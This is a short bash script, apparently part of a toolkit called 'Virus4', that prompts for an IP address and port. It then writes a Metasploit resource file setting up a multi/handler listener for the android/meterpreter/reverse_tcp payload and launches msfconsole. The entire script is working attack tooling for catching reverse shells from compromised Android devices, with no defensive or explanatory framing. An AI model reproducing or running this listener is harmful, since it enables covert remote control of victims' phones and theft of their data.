#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'                                                       
green='\033[1;32m'
red='\033[1;31m'                                                        
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install



echo -e "$cyan"
read -p "                  ip----->" ip
read -p "                    port---->" port
cd $HOME/Virus4/.msf
echo "use exploit/multi/handler" > .msf.rc
echo "set payload android/meterpreter/reverse_tcp" >> .msf.rc
echo "set lhost $ip" >> .msf.rc
echo "set lport $port" >> .msf.rc
echo "exploit" >> .msf.rc
msfconsole -r .msf.rc
